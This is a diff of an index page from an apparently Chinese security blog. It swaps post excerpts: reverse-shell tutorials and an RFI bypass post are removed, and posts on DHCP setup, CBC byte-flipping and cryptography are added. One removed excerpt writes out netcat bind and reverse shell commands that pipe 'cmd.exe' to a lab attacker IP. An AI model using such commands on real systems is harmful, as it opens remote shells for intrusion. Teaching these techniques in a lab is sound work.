@@ -346,80 +346,6 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/03/Linux-Reverse-Shell/" >
-            
-                <span>Linux 反弹 Shell</span>
-        </a>
-        <div class="abstract-content">
-            攻击场景123Attacker：192.168.0.106 win10Victim：192.168.2.140 kali
-
-NC 反弹 shellNetcat简介俗称瑞士军刀或NC，小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接地或容易地驱动。
-同时，nc又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。渗透测试中，linux主机一般自带nc，Windows主机需要自行上传。
-姿势一如果目标主机（受害机）支持“-e”选项的话，我们就可以直接进行利用。
-ps：为什么我们要在受害...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "木马后门">木马后门</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/03/Windows-Reverse-Shell/" >
-            
-                <span>Windows 反弹 Shell</span>
-        </a>
-        <div class="abstract-content">
-            NC 反弹 shell攻击场景：
-12　　Victim IP：  192.168.2.10　　Attacker IP：192.168.2.11
-
-正向 Shell我们想要弹回Victim的Shell，使用如下命令：
-Victim：nc -lvp 9999 -e cmd.exe
-Attacker：nc 192.168.2.10 9999 
-ps：先在肉鸡上开一个cmd服务，然后在攻击机上进行连接
-反向 ShellAttacker：nc -vlp 9999
-Victim：nc 192.168.2.11 9999 -e cmd.exe
-ps：先在攻击机上进行监听，然后在肉鸡上给Attacker...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "木马后门">木马后门</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "PowerShell">PowerShell</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
         <a class="abstract-title" href = "/2019/08/03/AWD-Bugs-Fix/" >
             
                 <span>AWD攻防赛之各类漏洞FIX方案</span>
@@ -561,30 +487,45 @@ BP爆破得到密码，同时在响应包里面得到flag
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/15/bypass-rfi-by-samba/" >
+        <a class="abstract-title" href = "/2019/05/12/Linux-DHCP-server-configuration-and-management/" >
             
-                <span>RFI巧用Samba绕过URL包含限制Getshell</span>
+                <span>Linux DHCP 服务器配置与管理</span>
         </a>
         <div class="abstract-content">
-            前言最近，在Twitter上看到有人发布了关于RFI限制绕过的姿势，于是拿来分析一下~~
+            环境介绍运行软件1VMware Workstation Pro 14
 
-RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“关闭”，指示PHP不加载远程HTTP或FTP URL，从而防止远程文件包含攻击。但是，即使allow_url_include和allow_url_fopen都设置为off，PHP也不会阻止SMB URL加载。
-攻击原理1unc -&gt; smb
+系统环境1CentOS-7-x86_64-1810
 
-攻击场景当易受攻击的PHP应用程序代码尝试从受攻击者控制的SMB共享加载PHP Web shell时，SMB共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问...
+操作配置DHCP 服务器搭建1)安装DHCP
+1yum install dhcp
+
+2) 设置虚拟机为仅主机模式、关闭虚拟机依靠主机的 DHCP 服务
+
+3) 配置dhcpd.conf (动态获取IP)
+
+4) 重启dhcpd服务
+1systemctl restart dhcpd
+
+5) 重启网卡
+1systemctl restart network
+
+6) 查看客户端 IP
+
+7) 配置dhcpd.conf (固定获取IP)
+ 
+8) 重启dhcpd服务
+1sy...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/15</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/12</span>
             </div>
             <!-- tags  -->
             
             <div class= abstract-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Bypass">Bypass</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "RFI">RFI</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Linux">Linux</a>
     
 </div>
             
@@ -643,57 +584,6 @@ DN...
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/12/Linux-DHCP-server-configuration-and-management/" >
-            
-                <span>Linux DHCP 服务器配置与管理</span>
-        </a>
-        <div class="abstract-content">
-            环境介绍运行软件1VMware Workstation Pro 14
-
-系统环境1CentOS-7-x86_64-1810
-
-操作配置DHCP 服务器搭建1)安装DHCP
-1yum install dhcp
-
-2) 设置虚拟机为仅主机模式、关闭虚拟机依靠主机的 DHCP 服务
-
-3) 配置dhcpd.conf (动态获取IP)
-
-4) 重启dhcpd服务
-1systemctl restart dhcpd
-
-5) 重启网卡
-1systemctl restart network
-
-6) 查看客户端 IP
-
-7) 配置dhcpd.conf (固定获取IP)
- 
-8) 重启dhcpd服务
-1sy...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Linux">Linux</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
         <a class="abstract-title" href = "/2019/04/26/Symmetric-Key-Encryption-DES/" >
             
                 <span>Symmetric Key Encryption DES</span>
@@ -713,6 +603,109 @@ DN...
             <div class= abstract-tags >
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "DES">DES</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/03/26/cbc-byte-reverse-attack/" >
+            
+                <span>针对 CBC 字节反转攻击的研究与漏洞复现</span>
+        </a>
+        <div class="abstract-content">
+            CBC 简介现代密码体制现代密码中的加密体制一般分为对称加密体制(Symmetric Key Encryption)和非对称加密体制(Asymmetric Key Encryption)。对称加密又分为分组加密和序列密码。
+分组密码
+分组密码：也叫块加密(block cyphers)，一次加密明文中的一个块。是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组经过解密运算（加密运算的逆运算），还原成明文组，有 ECB、CBC、CFB、OFB 四种工作模式。
+序列密码
+序列密码：也叫流加密(stream cyphers)，一次加密明文中的一个位。是指利用少量的密钥（制乱元素）通过...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/26</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "密码研究">密码研究</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CBC">CBC</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/03/24/symmetric-and-asymmetric-crypto-system/" >
+            
+                <span>对称密码体制和非对称密码体制</span>
+        </a>
+        <div class="abstract-content">
+            对称加密 (Symmetric Key Encryption)对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。对称加密有很多种算法，由于它效率很高，所以被广泛使用在很多加密协议的核心当中。自1977年美国颁布DES（Data Encryption Standard）密码算法作为美国数据加密标准以来，对称密码体制迅速发展，得到了世界各国的关注和普遍应用。对称密码体制从工作方式上可以分为分组加密和序列密码两大类。
+算法优缺点对称加密算法的优点：算法公开、计算量小、加密速度快、加密效率高。
+对称加密算法...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "密码研究">密码研究</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/03/08/routing-protocol-and-switching-technology/" >
+            
+                <span>路由协议与交换技术合集</span>
+        </a>
+        <div class="abstract-content">
+            笔者《Qftm》原文发布《博客园》1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;qftm&#x2F;category&#x2F;1414601.html
+
+路由器实现简单静态路由、浮动路由、负载均衡、远程登陆1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;qftm&#x2F;p&#x2F;10496681.html
+
+RIP 实验1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;qftm&#x2F;p&#x2F;10540441.html
+
+EIGRP 基础实验1https:&#x2F;&#x...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/08</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "协议">协议</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "路由协议">路由协议</a>
     
 </div>
             
@@ -1741,68 +1734,9 @@ DN...
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 66
+        Total : 63
         </div>
         <!-- search  -->
         
@@ -1888,11 +1822,6 @@ DN...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2020/03/01/apple-icloud-credential-stealing/" >Apple iCloud 凭证的窃取分析 -【CVE-2020-3841】</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">02/12</span><a class="archive-post-title" href= "/2020/02/12/Hackintosh-Of-Lenovo-R720-15IKBN/" >Hackintosh Of Lenovo R720 15IKBN</a>
         </li>
     
@@ -1933,11 +1862,6 @@ DN...
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2019/10/27/Kali-Rolling-2019/" >Kali Rolling 2019 系统配置总结（Updateing）</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2019/10/27/RoarCTF2019-Writeup/" >楼上请让路 RoarCTF2019 Writeup</a>
         </li>
     
     
@@ -2007,17 +1931,12 @@ DN...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/15</span><a class="archive-post-title" href= "/2019/05/15/bypass-rfi-by-samba/" >RFI巧用Samba绕过URL包含限制Getshell</a>
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2019/05/12/Linux-DHCP-server-configuration-and-management/" >Linux DHCP 服务器配置与管理</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2019/05/12/Linux-DNS-server-configuration-and-management/" >Linux DNS 服务器配置与管理</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2019/05/12/Linux-DHCP-server-configuration-and-management/" >Linux DHCP 服务器配置与管理</a>
         </li>
     
     
@@ -2179,19 +2098,19 @@ DN...
     
         <span class="sidebar-tag-name" data-tags="AWD"><span class="iconfont-archer">&#xe606;</span>AWD</span>
     
-        <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
-    
         <span class="sidebar-tag-name" data-tags="CSRF"><span class="iconfont-archer">&#xe606;</span>CSRF</span>
     
         <span class="sidebar-tag-name" data-tags="CMS"><span class="iconfont-archer">&#xe606;</span>CMS</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
+        <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
+    
         <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
     
-        <span class="sidebar-tag-name" data-tags="密码研究"><span class="iconfont-archer">&#xe606;</span>密码研究</span>
-    
         <span class="sidebar-tag-name" data-tags="电子取证"><span class="iconfont-archer">&#xe606;</span>电子取证</span>
+    
+        <span class="sidebar-tag-name" data-tags="密码研究"><span class="iconfont-archer">&#xe606;</span>密码研究</span>
     
         <span class="sidebar-tag-name" data-tags="MacOS"><span class="iconfont-archer">&#xe606;</span>MacOS</span>
     
@@ -2207,17 +2126,17 @@ DN...
     
         <span class="sidebar-tag-name" data-tags="协议"><span class="iconfont-archer">&#xe606;</span>协议</span>
     
-        <span class="sidebar-tag-name" data-tags="木马后门"><span class="iconfont-archer">&#xe606;</span>木马后门</span>
-    
         <span class="sidebar-tag-name" data-tags="后门分析"><span class="iconfont-archer">&#xe606;</span>后门分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="木马后门"><span class="iconfont-archer">&#xe606;</span>木马后门</span>
     
         <span class="sidebar-tag-name" data-tags="DES"><span class="iconfont-archer">&#xe606;</span>DES</span>
     
         <span class="sidebar-tag-name" data-tags="神兵利器"><span class="iconfont-archer">&#xe606;</span>神兵利器</span>
     
-        <span class="sidebar-tag-name" data-tags="PowerShell"><span class="iconfont-archer">&#xe606;</span>PowerShell</span>
-    
         <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="PowerShell"><span class="iconfont-archer">&#xe606;</span>PowerShell</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
@@ -2227,9 +2146,9 @@ DN...
     
         <span class="sidebar-tag-name" data-tags="RFI"><span class="iconfont-archer">&#xe606;</span>RFI</span>
     
-        <span class="sidebar-tag-name" data-tags="信息隐藏"><span class="iconfont-archer">&#xe606;</span>信息隐藏</span>
-    
         <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息隐藏"><span class="iconfont-archer">&#xe606;</span>信息隐藏</span>
     
         <span class="sidebar-tag-name" data-tags="MATLAB"><span class="iconfont-archer">&#xe606;</span>MATLAB</span>
     
@@ -2241,9 +2160,9 @@ DN...
     
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
-        <span class="sidebar-tag-name" data-tags="Firewalld"><span class="iconfont-archer">&#xe606;</span>Firewalld</span>
-    
         <span class="sidebar-tag-name" data-tags="路由协议"><span class="iconfont-archer">&#xe606;</span>路由协议</span>
+    
+        <span class="sidebar-tag-name" data-tags="Firewalld"><span class="iconfont-archer">&#xe606;</span>Firewalld</span>
     
         <span class="sidebar-tag-name" data-tags="IPS"><span class="iconfont-archer">&#xe606;</span>IPS</span>
     
@@ -2300,11 +2219,11 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="网络安全"><span class="iconfont-archer">&#xe60a;</span>网络安全</span>
     
-        <span class="sidebar-category-name" data-categories="算法艺术"><span class="iconfont-archer">&#xe60a;</span>算法艺术</span>
-    
         <span class="sidebar-category-name" data-categories="WebSecurity"><span class="iconfont-archer">&#xe60a;</span>WebSecurity</span>
     
         <span class="sidebar-category-name" data-categories="漏洞挖掘"><span class="iconfont-archer">&#xe60a;</span>漏洞挖掘</span>
+    
+        <span class="sidebar-category-name" data-categories="算法艺术"><span class="iconfont-archer">&#xe60a;</span>算法艺术</span>
     
         <span class="sidebar-category-name" data-categories="运维"><span class="iconfont-archer">&#xe60a;</span>运维</span>
     
@@ -2314,15 +2233,17 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
     
-        <span class="sidebar-category-name" data-categories="木马后门"><span class="iconfont-archer">&#xe60a;</span>木马后门</span>
-    
         <span class="sidebar-category-name" data-categories="后门分析"><span class="iconfont-archer">&#xe60a;</span>后门分析</span>
+    
+        <span class="sidebar-category-name" data-categories="木马后门"><span class="iconfont-archer">&#xe60a;</span>木马后门</span>
     
         <span class="sidebar-category-name" data-categories="神兵利器"><span class="iconfont-archer">&#xe60a;</span>神兵利器</span>
     
         <span class="sidebar-category-name" data-categories="信息隐藏"><span class="iconfont-archer">&#xe60a;</span>信息隐藏</span>
     
         <span class="sidebar-category-name" data-categories="逆向工程"><span class="iconfont-archer">&#xe60a;</span>逆向工程</span>
+    
+        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
         <span class="sidebar-category-name" data-categories="路由协议"><span class="iconfont-archer">&#xe60a;</span>路由协议</span>
     
@@ -2333,8 +2254,6 @@ jsonContent:
         <span class="sidebar-category-name" data-categories="软件工程"><span class="iconfont-archer">&#xe60a;</span>软件工程</span>
     
         <span class="sidebar-category-name" data-categories="大数据"><span class="iconfont-archer">&#xe60a;</span>大数据</span>
-    
-        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
